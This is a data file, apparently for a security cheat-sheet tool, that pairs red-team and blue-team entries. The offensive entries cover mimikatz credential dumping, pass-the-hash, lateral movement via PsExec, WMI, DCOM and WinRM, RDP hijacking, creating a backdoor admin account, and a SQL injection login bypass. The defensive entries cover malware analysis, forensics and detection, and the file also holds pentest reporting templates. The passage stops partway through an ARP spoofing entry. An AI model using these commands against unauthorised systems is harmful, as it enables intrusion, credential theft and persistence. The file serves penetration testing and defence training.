    { id: 're-strings-analysis', title: 'Static Analysis — Strings & Heuristics', team: 'blue', category: 'reveng',
      description: 'Quick static analysis: strings, file type, entropy, section analysis, import table review.',
      tags: ['strings', 'file', 'entropy', 'static-analysis'], command: '# === File identification ===\nfile suspicious.exe\n\n# === Strings extraction ===\nstrings suspicious.exe | head -100\nstrings -n 8 suspicious.exe              # Min 8 chars\nstrings -e l suspicious.exe > unicode.txt # Unicode (little-endian)\n\n# === Entropy analysis (high = packed/encrypted) ===\nrabin2 -S suspicious.exe                 # Section info with entropy\n# Or Python:\npython3 -c "\nimport math, sys\ndata = open(sys.argv[1], \'rb\').read()\nent = -sum((c/len(data))*math.log2(c/len(data)) for c in [data.count(bytes([b])) for b in range(256)] if c)\nprint(f\'Entropy: {ent:.2f}/8.0 {"(packed/encrypted)" if ent > 7 else "(normal)"}\')\n" suspicious.exe\n\n# === PE Analysis (Windows) ===\n# pefile (Python)\npython3 -c "\nimport pefile\npe = pefile.PE(\'suspicious.exe\')\nprint(f\'Compile: {pe.FILE_HEADER.TimeDateStamp}\')\nfor s in pe.sections: print(f\'{s.Name.decode().strip(chr(0)):8s} entropy={s.get_entropy():.2f}\')\nfor e in pe.DIRECTORY_ENTRY_IMPORT: print(f\'\\n{e.dll.decode()}\'); [print(f\'  {i.name.decode()}\') for i in e.imports if i.name]\n"\n\n# === ELF Analysis (Linux) ===\nreadelf -h suspicious.elf    # ELF header\nreadelf -S suspicious.elf    # Sections\nobjdump -d suspicious.elf    # Disassemble',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },

    { id: 're-dynamic-analysis', title: 'Dynamic Analysis — Sandboxing', team: 'blue', category: 'reveng',
      description: 'Run malware safely: sandbox setup, strace/ltrace, API monitoring, network capture.',
      tags: ['sandbox', 'dynamic-analysis', 'strace', 'malware'], command: '# === Linux Dynamic Analysis ===\n# Trace system calls\nstrace -f -o trace.log ./suspicious\nstrace -e trace=network ./suspicious     # Network calls only\nstrace -e trace=file ./suspicious        # File operations only\n\n# Trace library calls\nltrace -o ltrace.log ./suspicious\n\n# Monitor file changes\ninotifywait -m -r /tmp /home --format "%w%f %e" &\n./suspicious\n\n# Network monitoring during execution\ntcpdump -i any -w malware_traffic.pcap &\n./suspicious\nkill %1\n\n# === Windows Dynamic Analysis ===\n# Tools: Process Monitor, Process Explorer, Wireshark, Regshot\n# 1. Take Regshot snapshot (before)\n# 2. Start Process Monitor (filter on process name)\n# 3. Start Wireshark\n# 4. Run malware\n# 5. Take Regshot snapshot (after) → compare\n\n# === Online Sandboxes ===\n# https://www.hybrid-analysis.com/\n# https://any.run/\n# https://app.joesandbox.com/\n# https://www.virustotal.com/\n\n# === Docker Sandbox (quick isolated test) ===\ndocker run --rm -it --network none -v $(pwd)/sample:/sample:ro ubuntu bash\n# --network none = no internet access\n# :ro = read-only mount',
      killchain: 'actions', attack: ['defense-evasion', 'execution'], pyramid: 'tools', owasp: [] },

    { id: 're-patching', title: 'Binary Patching & Keygen', team: 'red', category: 'reveng',
      description: 'Patch binaries: bypass checks, NOP out conditions, modify jumps. CTF/crackme focused.',
      tags: ['patching', 'reverse-engineering', 'ctf', 'binary'], command: '# === Common Patch Patterns ===\n# JNE → JE (flip conditional jump)\n# 75 xx → 74 xx  (JNZ → JZ)\n# 74 xx → 75 xx  (JZ → JNZ)\n# 74 xx → EB xx  (JZ → JMP, always jump)\n# xx xx → 90 90  (NOP out instruction)\n\n# === Radare2 Patching ===\nr2 -w ./crackme          # Open in write mode\ns 0x08048456             # Seek to target\nwx 9090                  # Write NOP NOP\nwa je 0x08048470         # Write assembly\nquit\n\n# === Python Patching ===\npython3 -c "\ndata = bytearray(open(\'crackme\', \'rb\').read())\noffset = 0x456  # File offset (not virtual address!)\ndata[offset] = 0xEB  # JMP (unconditional)\nopen(\'crackme_patched\', \'wb\').write(data)\n"\n\n# === GDB Runtime Patching ===\ngdb ./crackme\nb *0x08048456\nr\nset *(char*)0x08048456 = 0xEB  # Patch JZ → JMP\ncontinue\n\n# === Ghidra Patching ===\n# Right-click instruction → Patch Instruction\n# File → Export Program → Binary (save patched version)\n\n# === Offset Conversion ===\n# Virtual Address → File Offset\n# file_offset = virtual_addr - section_vaddr + section_offset\nreadelf -S binary | grep .text  # Get section info',
      killchain: 'exploitation', attack: ['defense-evasion'], pyramid: 'ttps', owasp: [] },

    // ── Lateral Movement ─────────────────────────────────────
    { id: 'lateral-psexec', title: 'PsExec / SMB Execution', team: 'red', category: 'lateral',
      description: 'Remote execution via PsExec (Sysinternals), Impacket psexec, and SMBexec for lateral movement.',
      tags: ['psexec', 'smb', 'lateral-movement', 'impacket'],
      commands: {
        linux: '# Impacket PsExec (from Linux → Windows target)\nimpacket-psexec domain/user:password@TARGET_IP\nimpacket-psexec domain/user@TARGET_IP -hashes :NTLM_HASH\n\n# Impacket SMBExec (more stealthy, no binary upload)\nimpacket-smbexec domain/user:password@TARGET_IP\n\n# Impacket WMIExec (via WMI, no service creation)\nimpacket-wmiexec domain/user:password@TARGET_IP\n\n# CrackMapExec — multi-target spray\ncrackmapexec smb 10.10.10.0/24 -u admin -p Password123 --exec-method smbexec -x "whoami"\n\n# Execute command (no shell)\nimpacket-psexec domain/user:password@TARGET_IP "cmd /c whoami"',
        windows: '# Sysinternals PsExec\nPsExec.exe \\\\TARGET_IP -u domain\\user -p password cmd.exe\nPsExec.exe \\\\TARGET_IP -u domain\\user -p password -s cmd.exe  # SYSTEM\nPsExec.exe \\\\TARGET_IP -u domain\\user -p password -c payload.exe  # Copy & exec\n\n# PowerShell Invoke-PsExec (PowerSploit)\nInvoke-PsExec -ComputerName TARGET -Command "whoami"\n\n# sc.exe (service creation — manual PsExec-like)\nsc \\\\TARGET create backdoor binPath= "cmd /c whoami > C:\\out.txt"\nsc \\\\TARGET start backdoor\nsc \\\\TARGET delete backdoor'
      },
      killchain: 'actions', attack: ['lateral-movement', 'execution'], pyramid: 'tools', owasp: [] },

    { id: 'lateral-wmi-dcom', title: 'WMI & DCOM Lateral Movement', team: 'red', category: 'lateral',
      description: 'Lateral movement via WMI and DCOM objects — stealthier alternatives to PsExec.',
      tags: ['wmi', 'dcom', 'lateral-movement', 'windows'],
      commands: {
        linux: '# Impacket WMIExec (from Linux)\nimpacket-wmiexec domain/user:password@TARGET_IP\nimpacket-wmiexec domain/user@TARGET_IP -hashes :NTLM_HASH\n\n# Impacket DCOM Exec\nimpacket-dcomexec domain/user:password@TARGET_IP\n\n# CrackMapExec via WMI\ncrackmapexec smb TARGET_IP -u user -p pass --exec-method wmiexec -x "whoami"',
        windows: '# WMI — Remote process creation\nwmic /node:TARGET_IP /user:domain\\user /password:pass process call create "cmd /c whoami > C:\\out.txt"\n\n# PowerShell WMI\nInvoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami"\n\n# PowerShell CIM (modern WMI)\n$s = New-CimSession -ComputerName TARGET -Credential (Get-Credential)\nInvoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="calc.exe"}\n\n# DCOM — ShellWindows object\n$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET"))\n$com.Item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\\Windows\\System32",$null,0)\n\n# DCOM — MMC20.Application (another method)\n$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","TARGET"))\n$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\\out.txt","7")'
      },
      killchain: 'actions', attack: ['lateral-movement', 'execution'], pyramid: 'ttps', owasp: [] },

    { id: 'lateral-winrm', title: 'WinRM & Evil-WinRM', team: 'red', category: 'lateral',
      description: 'Remote management via WinRM (port 5985/5986): Evil-WinRM, PowerShell remoting, pass-the-hash.',
      tags: ['winrm', 'evil-winrm', 'lateral-movement', 'powershell'],
      commands: {
        linux: '# Evil-WinRM — full featured WinRM shell\nevil-winrm -i TARGET_IP -u user -p password\nevil-winrm -i TARGET_IP -u user -H NTLM_HASH      # Pass-the-Hash\nevil-winrm -i TARGET_IP -u user -p pass -s /scripts/ # Load PS scripts\nevil-winrm -i TARGET_IP -u user -p pass -e /exes/   # Upload executables\n\n# Evil-WinRM features (inside session)\nmenu                    # Show commands\nupload /local/file.exe  # Upload file\ndownload C:\\loot.txt    # Download file\nInvoke-Binary /opt/mimikatz.exe  # Run .NET binary in memory',
        windows: '# PowerShell Remoting (WinRM)\nEnable-PSRemoting -Force   # On target (admin)\n\n# Interactive session\nEnter-PSSession -ComputerName TARGET -Credential (Get-Credential)\n\n# Execute command remotely\nInvoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami; hostname }\n\n# Execute on multiple targets\nInvoke-Command -ComputerName TARGET1,TARGET2,TARGET3 -ScriptBlock { Get-Process }\n\n# Pass-the-Hash with Rubeus + WinRM\n# First get TGT with Rubeus, then:\nEnter-PSSession -ComputerName TARGET'
      },
      killchain: 'actions', attack: ['lateral-movement', 'execution'], pyramid: 'tools', owasp: [] },

    { id: 'lateral-pth', title: 'Pass-the-Hash / Pass-the-Ticket', team: 'red', category: 'lateral',
      description: 'Authentication attacks: NTLM pass-the-hash, Kerberos pass-the-ticket, overpass-the-hash.',
      tags: ['pass-the-hash', 'pth', 'mimikatz', 'kerberos', 'lateral-movement'], command: '# === Pass-the-Hash (NTLM) ===\n# Extract hashes (on compromised host)\nmimikatz # sekurlsa::logonpasswords\nmimikatz # lsadump::sam\n\n# PtH with Mimikatz\nmimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:HASH_HERE /run:cmd.exe\n\n# PtH with Impacket (Linux)\nimpacket-psexec -hashes :NTLM_HASH domain/user@TARGET\nimpacket-wmiexec -hashes :NTLM_HASH domain/user@TARGET\n\n# PtH with CrackMapExec\ncrackmapexec smb TARGET -u admin -H NTLM_HASH -x "whoami"\n\n# PtH with Evil-WinRM\nevil-winrm -i TARGET -u user -H NTLM_HASH\n\n# === Pass-the-Ticket (Kerberos) ===\n# Export tickets\nmimikatz # sekurlsa::tickets /export\n\n# Inject ticket\nmimikatz # kerberos::ptt ticket.kirbi\n\n# Impacket (Linux) — request TGT with hash\nimpacket-getTGT -hashes :NTLM_HASH domain/user\nexport KRB5CCNAME=user.ccache\nimpacket-psexec -k -no-pass domain/user@TARGET\n\n# === Overpass-the-Hash ===\n# Use NTLM hash to get Kerberos TGT\nmimikatz # sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:powershell\n# Then use Kerberos auth (appears legit)',
      killchain: 'actions', attack: ['lateral-movement', 'credential-access'], pyramid: 'ttps', owasp: [] },

    { id: 'lateral-rdp', title: 'RDP Hijacking & Tunneling', team: 'red', category: 'lateral',
      description: 'RDP lateral movement: session hijacking, enable RDP, tunnel through compromised hosts.',
      tags: ['rdp', 'lateral-movement', 'hijack', 'tunnel'], command: '# === Enable RDP (requires admin) ===\n# Registry\nreg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n# Firewall\nnetsh advfirewall firewall set rule group="remote desktop" new enable=Yes\n\n# === Add user for RDP ===\nnet user backdoor P@ssw0rd /add\nnet localgroup "Remote Desktop Users" backdoor /add\nnet localgroup administrators backdoor /add\n\n# === RDP Session Hijacking (SYSTEM required) ===\n# List sessions\nquery user\n# Hijack session without password (as SYSTEM)\ntscon SESSION_ID /dest:rdp-tcp#0\n\n# Get SYSTEM for hijacking\nPsExec.exe -s -i cmd.exe\n# Then: tscon 2 /dest:console\n\n# === SharpRDP — RDP command execution (no GUI) ===\nSharpRDP.exe computername=TARGET command="whoami" username=domain\\user password=Password\n\n# === RDP Tunneling ===\n# Tunnel RDP through SSH\nssh -L 3389:INTERNAL_TARGET:3389 user@PIVOT_HOST\n# Connect: mstsc /v:localhost\n\n# Chisel tunnel\n# On pivot: chisel server -p 8080 --reverse\n# On attacker: chisel client PIVOT:8080 R:3389:INTERNAL:3389',
      killchain: 'actions', attack: ['lateral-movement'], pyramid: 'ttps', owasp: [] },

    { id: 'lateral-detection', title: 'Lateral Movement Detection', team: 'blue', category: 'lateral',
      description: 'Detect lateral movement: event log indicators, network signatures, honeypots.',
      tags: ['detection', 'lateral-movement', 'blue-team', 'monitoring'], command: '# === Windows Event Log Indicators ===\n# PsExec detection\n# Event 7045: New service installed (PSEXESVC)\nGet-WinEvent -FilterHashtable @{LogName="System"; Id=7045} | Where-Object {$_.Message -match "PSEXESVC"}\n\n# WMI lateral movement\n# Event 4648: Logon with explicit credentials\n# Event 4624 Type 3: Network logon from unusual source\n\n# WinRM detection\n# Event 4648 + 91 (WinRM connection)\nGet-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-WinRM/Operational"; Id=91}\n\n# RDP detection\n# Event 4624 Type 10: RDP logon\nGet-WinEvent -FilterHashtable @{LogName="Security"; Id=4624} | Where-Object {$_.Properties[8].Value -eq 10}\n\n# === Network Indicators ===\n# SMB (445) from workstation to workstation (unusual)\n# WMI (135 + high ports) between endpoints\n# WinRM (5985/5986) from unexpected sources\n# RDP (3389) workstation-to-workstation\n\n# === Splunk Queries ===\n# Lateral movement sweep\nindex=main (EventCode=4624 LogonType=3) | stats dc(dest) as targets by src_ip | where targets > 3\n\n# PsExec service creation\nindex=main EventCode=7045 ServiceName="PSEXESVC*"\n\n# === Honeypot / Deception ===\n# Deploy honeypot accounts with attractive names (svc_backup, admin_legacy)\n# Monitor for any auth attempts against these accounts\n# Tools: Thinkst Canary, Artillery, HoneyBadger',
      killchain: 'actions', attack: ['lateral-movement', 'discovery'], pyramid: 'ttps', owasp: [] },

    // ── Windows Forensics ────────────────────────────────────
    { id: 'volatility-memdump', title: 'Volatility — Memory Analysis', team: 'blue', category: 'winforensics',
      description: 'Volatility3 memory forensics: process tree, DLL list, command lines, malfind, network connections.',
      tags: ['volatility', 'memory', 'forensics', 'malware'], command: '# Install\npip install volatility3\n# Or: git clone https://github.com/volatilityfoundation/volatility3.git\n\n# === Process Analysis ===\nvol3 -f memdump.mem windows.pstree.PsTree       # Process tree\nvol3 -f memdump.mem windows.pslist.PsList        # Process list\nvol3 -f memdump.mem windows.psscan.PsScan        # Hidden processes\nvol3 -f memdump.mem windows.cmdline.CmdLine      # Command line args\nvol3 -f memdump.mem windows.dlllist.DllList       # Loaded DLLs\n\n# === Malware Detection ===\nvol3 -f memdump.mem windows.malfind.Malfind      # Injected code\nvol3 -f memdump.mem windows.netscan.NetScan      # Network connections\nvol3 -f memdump.mem windows.handles.Handles      # Open handles\n\n# === File & Registry ===\nvol3 -f memdump.mem windows.filescan.FileScan    # File objects\nvol3 -f memdump.mem windows.registry.hivelist.HiveList  # Registry hives\nvol3 -f memdump.mem windows.registry.printkey.PrintKey --key "Software\\Microsoft\\Windows\\CurrentVersion\\Run"\n\n# === Dump artifacts ===\nvol3 -f memdump.mem windows.pslist.PsList --pid 1234 --dump  # Dump process\nvol3 -f memdump.mem windows.dumpfiles.DumpFiles --pid 1234   # Dump files\n\n# === Batch analysis ===\nfor plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.cmdline.CmdLine windows.netscan.NetScan; do\n  vol3 -q -f memdump.mem $plugin > memdump.$plugin.txt\ndone',
      killchain: 'actions', attack: ['collection', 'discovery'], pyramid: 'tools', owasp: [] },

    { id: 'registry-forensics', title: 'Windows Registry Forensics', team: 'blue', category: 'winforensics',
      description: 'Key registry locations for forensic analysis: autoruns, user activity, USB history, program execution.',
      tags: ['registry', 'forensics', 'windows', 'artifacts'], command: '# === System Information ===\n# OS Version:    SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\n# Computer Name: SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName\n# Time Zone:     SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation\n# Network:       SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\n\n# === Persistence (Autoruns) ===\n# NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n# NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n# SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n# SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n# SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run\n\n# === User Activity ===\n# Recent files:   NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\n# Typed paths:    NTUSER.DAT\\...\\Explorer\\TypedPaths\n# Search queries: NTUSER.DAT\\...\\Explorer\\WordWheelQuery\n# UserAssist:     NTUSER.DAT\\...\\Explorer\\UserAssist\\{GUID}\\Count\n\n# === Program Execution Evidence ===\n# ShimCache:   SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache\n# AmCache:     Amcache.hve\\Root\\File\\{Volume GUID}\\\n# BAM/DAM:     SYSTEM\\CurrentControlSet\\Services\\bam\\UserSettings\\{SID}\n\n# === USB Forensics ===\n# Devices:     SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\n# Volume name: SOFTWARE\\Microsoft\\Windows Portable Devices\\Devices\n\n# === Tools ===\n# RegRipper:   regripper -r NTUSER.DAT -p all > report.txt\n# Registry Explorer (Eric Zimmerman): GUI analysis\n# RECmd: RECmd.exe -d C:\\evidence\\registry --csv output/',
      killchain: 'actions', attack: ['collection', 'discovery'], pyramid: 'artifacts', owasp: [] },

    { id: 'disk-forensics', title: 'Disk Imaging & Artifact Collection', team: 'blue', category: 'winforensics',
      description: 'Forensic disk imaging, evidence collection, timeline creation, artifact preservation.',
      tags: ['disk', 'imaging', 'forensics', 'evidence'],
      commands: {
        linux: '# === Disk Imaging ===\n# dd (raw image)\ndd if=/dev/sda of=evidence.dd bs=4M status=progress\n\n# dc3dd (forensic dd with hashing)\ndc3dd if=/dev/sda of=evidence.dd hash=sha256 log=imaging.log\n\n# ewfacquire (E01 format — compressed)\newfacquire /dev/sda -t evidence -e examiner -D "Case 001"\n\n# === Verify Image ===\nsha256sum evidence.dd\n\n# === Mount Read-Only ===\nmount -o ro,loop,noexec evidence.dd /mnt/evidence\n\n# === Timeline Creation ===\n# Plaso/log2timeline\nlog2timeline.py timeline.plaso evidence.dd\npsort.py -o l2tcsv timeline.plaso > timeline.csv\n\n# === Key Artifacts ===\n# MFT:        /\\$MFT\n# Event Logs: /Windows/System32/winevt/Logs/\n# Prefetch:   /Windows/Prefetch/\n# Registry:   /Windows/System32/config/ (SAM, SYSTEM, SOFTWARE, SECURITY)\n# User hives: /Users/<user>/NTUSER.DAT\n# Browser:    /Users/<user>/AppData/Local/Google/Chrome/User Data/Default/',
        windows: '# === FTK Imager (GUI) ===\n# File → Create Disk Image → Physical Drive\n# Select E01 format → fill case info → start\n\n# === Arsenal Image Mounter ===\n# Mount forensic image as read-only drive\n\n# === KAPE (Kroll Artifact Parser and Extractor) ===\nKAPE.exe --tsource C: --tdest C:\\Evidence --tflush --target !SANS_Triage\n\n# === Key Windows Artifacts ===\n# Prefetch: C:\\Windows\\Prefetch\\*.pf (program execution)\n# Amcache: C:\\Windows\\AppCompat\\Programs\\Amcache.hve\n# SRUM:    C:\\Windows\\System32\\sru\\SRUDB.dat (resource usage)\n# Jumplists: AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\\n# Shellbags: USRCLASS.DAT\n\n# === Eric Zimmerman Tools ===\nPECmd.exe -d C:\\Windows\\Prefetch --csv output\\  # Prefetch parser\nMFTECmd.exe -f \\$MFT --csv output\\              # MFT parser\nAmcacheParser.exe -f Amcache.hve --csv output\\  # Amcache parser\nJLECmd.exe -d AutomaticDestinations --csv output\\  # Jumplists'
      },
      killchain: 'actions', attack: ['collection'], pyramid: 'artifacts', owasp: [] },

    { id: 'memory-acquisition', title: 'Memory Acquisition', team: 'blue', category: 'winforensics',
      description: 'Capture live memory for forensic analysis: WinPmem, DumpIt, Belkasoft RAM Capturer.',
      tags: ['memory', 'acquisition', 'forensics', 'live-response'], command: '# === Windows Memory Acquisition ===\n# WinPmem (Rekall)\nwinpmem_mini_x64.exe evidence.raw\n\n# DumpIt (Comae)\nDumpIt.exe /OUTPUT evidence.raw /QUIET\n\n# Belkasoft RAM Capturer (GUI — free)\n# Download: belkasoft.com/ram-capturer\n\n# FTK Imager\n# File → Capture Memory → select output path\n\n# === Linux Memory Acquisition ===\n# LiME (Linux Memory Extractor)\nsudo insmod lime.ko "path=/evidence/memory.lime format=lime"\n\n# /proc/kcore (if available)\ndd if=/proc/kcore of=memory.raw bs=1M\n\n# AVML (Microsoft)\nsudo avml memory.raw\n\n# === Virtual Machine Memory ===\n# VMware: .vmem file in VM directory\n# VirtualBox: VBoxManage debugvm "VMName" dumpvmcore --filename=memory.elf\n# Hyper-V: checkpoint → .bin files\n\n# === Integrity ===\n# Always hash the memory image\nsha256sum evidence.raw > evidence.raw.sha256\n\n# === What to Analyze ===\n# Processes, DLLs, network connections (Volatility)\n# Encryption keys in memory\n# Malware code injection\n# Command history\n# Credentials (mimikatz-style)',
      killchain: 'actions', attack: ['collection'], pyramid: 'artifacts', owasp: [] },

    { id: 'prefetch-timeline', title: 'Prefetch & Execution Timeline', team: 'blue', category: 'winforensics',
      description: 'Analyze Windows Prefetch files, SRUM database, and Amcache for program execution evidence.',
      tags: ['prefetch', 'timeline', 'execution', 'forensics'], command: '# === Prefetch Files (C:\\Windows\\Prefetch) ===\n# .pf files contain: app name, run count, last 8 execution times, files/dirs loaded\n# Naming: APPNAME-HASH.pf (hash based on path + args)\n\n# Parse with PECmd (Eric Zimmerman)\nPECmd.exe -d C:\\Windows\\Prefetch --csv C:\\output\\ --csvf prefetch.csv\nPECmd.exe -f "C:\\Windows\\Prefetch\\CMD.EXE-89305D47.pf"  # Single file\n\n# === SRUM (System Resource Usage Monitor) ===\n# C:\\Windows\\System32\\sru\\SRUDB.dat\n# Contains: network usage per app, CPU time, bytes sent/received\n\n# Parse with SrumECmd\nSrumECmd.exe -f SRUDB.dat -r SOFTWARE --csv C:\\output\\\n\n# === Amcache.hve ===\n# C:\\Windows\\AppCompat\\Programs\\Amcache.hve\n# Contains: file path, SHA1, first execution time, size\n\nAmcacheParser.exe -f Amcache.hve --csv C:\\output\\ --csvf amcache.csv\n\n# === ShimCache (AppCompatCache) ===\n# Registry: SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache\n# Contains: file path, last modified time, execution flag\n\nAppCompatCacheParser.exe -f SYSTEM --csv C:\\output\\\n\n# === Timeline (combine all sources) ===\n# 1. Parse all artifacts to CSV\n# 2. Import into Timeline Explorer (Eric Zimmerman)\n# 3. Sort by timestamp\n# 4. Filter by time window of interest\n# 5. Correlate: what ran, what files were accessed, what network connections were made',
      killchain: 'actions', attack: ['collection', 'discovery'], pyramid: 'artifacts', owasp: [] },

    // ── Reporting ────────────────────────────────────────────
    { id: 'pentest-report', title: 'Pentest Report Structure', team: 'red', category: 'reporting',
      description: 'Standard penetration test report template: executive summary, methodology, findings, remediation.',
      tags: ['report', 'pentest', 'documentation', 'deliverable'], command: '# === Pentest Report Structure ===\n# (Based on TCM Security template)\n\n# 1. COVER PAGE\n#    - Client name, assessment type, date range, assessor\n\n# 2. EXECUTIVE SUMMARY (1-2 pages, non-technical)\n#    - Overall risk rating\n#    - Key findings overview (high-level)\n#    - Strategic recommendations\n#    - Scope and methodology summary\n\n# 3. SCOPE & METHODOLOGY\n#    - Target systems/networks\n#    - Testing approach (black/gray/white box)\n#    - Tools used\n#    - Testing timeline\n#    - Out-of-scope items\n\n# 4. FINDINGS (per finding)\n#    - Title & ID (e.g., VULN-001)\n#    - Severity: Critical / High / Medium / Low / Info\n#    - CVSS Score: 0.0-10.0\n#    - Description\n#    - Affected systems\n#    - Evidence (screenshots, commands, output)\n#    - Impact\n#    - Remediation\n#    - References (CVE, CWE, OWASP)\n\n# 5. REMEDIATION SUMMARY\n#    - Priority-ordered fix list\n#    - Quick wins vs long-term improvements\n\n# 6. APPENDIX\n#    - Full tool output\n#    - Scan results\n#    - Detailed technical data\n\n# Templates:\n# https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report\n# https://github.com/juliocesarfort/public-pentesting-reports',
      killchain: 'actions', attack: ['discovery'], pyramid: 'ttps', owasp: [] },

    { id: 'finding-template', title: 'Vulnerability Finding Format', team: 'red', category: 'reporting',
      description: 'Standard vulnerability finding format with severity, evidence, impact, and remediation.',
      tags: ['finding', 'vulnerability', 'report', 'cvss'], command: '# === Vulnerability Finding Template ===\n\n# FINDING ID: VULN-001\n# TITLE: SQL Injection in Login Form\n# SEVERITY: Critical\n# CVSS: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\n# CWE: CWE-89 (Improper Neutralization of SQL)\n# OWASP: A03:2021 — Injection\n\n# DESCRIPTION:\n# The login form at https://target.com/login is vulnerable to\n# SQL injection via the username parameter. An unauthenticated\n# attacker can extract database contents or bypass authentication.\n\n# AFFECTED SYSTEMS:\n# - https://target.com/login (POST /api/auth/login)\n# - Parameter: username\n\n# EVIDENCE:\n# Request:\n# POST /api/auth/login\n# Content-Type: application/json\n# {"username": "admin\' OR 1=1--", "password": "anything"}\n#\n# Response:\n# HTTP/1.1 200 OK\n# {"token": "eyJhbG...", "user": "admin"}\n#\n# [Screenshot: login-sqli-evidence.png]\n\n# IMPACT:\n# - Authentication bypass (admin access)\n# - Full database extraction\n# - Potential RCE via stacked queries\n\n# REMEDIATION:\n# - Use parameterized queries / prepared statements\n# - Implement input validation\n# - Apply WAF rules as interim measure\n# - Reference: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html\n\n# === CVSS Calculator ===\n# https://www.first.org/cvss/calculator/3.1',
      killchain: 'actions', attack: ['discovery'], pyramid: 'ttps', owasp: ['A03'] },

    { id: 'evidence-collection', title: 'Evidence & Screenshot Documentation', team: 'red', category: 'reporting',
      description: 'Capture and organize evidence during engagements: screenshots, terminal logs, request/response pairs.',
      tags: ['evidence', 'screenshots', 'documentation', 'pentest'], command: '# === Terminal Logging ===\n# Record entire session\nscript -a session_$(date +%Y%m%d_%H%M).log\n# ... do your testing ...\nexit  # Stop recording\n\n# Tmux logging\n# Ctrl+B then : then capture-pane -S - && save-buffer session.log\n\n# === Screenshot Tools ===\n# Linux\nscrot -d 3 evidence_%Y%m%d_%H%M%S.png   # Delay 3 seconds\nflameshot gui                             # Region select + annotate\n\n# Windows\n# Win+Shift+S (Snip & Sketch)\n# Greenshot (with auto-naming)\n\n# === Naming Convention ===\n# VULN-ID_description_datetime.png\n# VULN-001_sqli-login-bypass_20240115_1430.png\n# VULN-002_rce-proof-whoami_20240115_1445.png\n\n# === Burp Suite Evidence ===\n# Right-click request → Copy to file\n# Or: Logger → export selected items\n\n# === Curl Request Documentation ===\ncurl -v -o response.html -D headers.txt https://target.com/api/vuln 2>request_debug.txt\n\n# === Organize Evidence ===\nmkdir -p evidence/{screenshots,requests,scans,loot}\n# evidence/\n# ├── screenshots/  (annotated PNGs)\n# ├── requests/     (HTTP request/response pairs)\n# ├── scans/        (nmap, nuclei, nikto output)\n# └── loot/         (credentials, data samples)',
      killchain: 'actions', attack: ['collection'], pyramid: 'ttps', owasp: [] },

    { id: 'risk-rating', title: 'Risk Rating & CVSS Scoring', team: 'blue', category: 'reporting',
      description: 'Risk assessment frameworks: CVSS 3.1 scoring, DREAD model, risk matrix, severity classification.',
      tags: ['cvss', 'risk', 'severity', 'assessment'], command: '# === CVSS 3.1 Base Score ===\n# Attack Vector:    Network (0.85) / Adjacent (0.62) / Local (0.55) / Physical (0.20)\n# Attack Complexity: Low (0.77) / High (0.44)\n# Privileges Req:   None (0.85) / Low (0.62/0.68) / High (0.27/0.50)\n# User Interaction:  None (0.85) / Required (0.62)\n# Scope:            Unchanged / Changed\n# Impact (C/I/A):   None / Low / High\n\n# Severity Ranges:\n# Critical: 9.0-10.0\n# High:     7.0-8.9\n# Medium:   4.0-6.9\n# Low:      0.1-3.9\n# Info:     0.0\n\n# Calculator: https://www.first.org/cvss/calculator/3.1\n\n# === DREAD Model (Microsoft) ===\n# Damage:         How much damage? (1-10)\n# Reproducibility: How easy to reproduce? (1-10)\n# Exploitability:  How easy to exploit? (1-10)\n# Affected Users:  How many affected? (1-10)\n# Discoverability: How easy to discover? (1-10)\n# Score = average of all five\n\n# === Risk Matrix ===\n#              Impact\n#           Low  Med  High\n# Likely    Med  High Crit\n# Possible  Low  Med  High\n# Unlikely  Info Low  Med\n\n# === Remediation Priority ===\n# P1 (24h):  Critical — RCE, auth bypass, data breach\n# P2 (7d):   High — privesc, significant data exposure\n# P3 (30d):  Medium — XSS, CSRF, info disclosure\n# P4 (90d):  Low — best practice, hardening\n# P5 (next): Info — informational, no direct risk',
      killchain: 'actions', attack: ['discovery'], pyramid: 'ttps', owasp: [] },

    // ── Network Attacks ──────────────────────────────────────
    { id: 'arp-spoof', title: 'ARP Spoofing & MITM', team: 'red', category: 'netattack',
      description: 'ARP cache poisoning for man-in-the-middle: arpspoof, ettercap, Bettercap network MITM.',
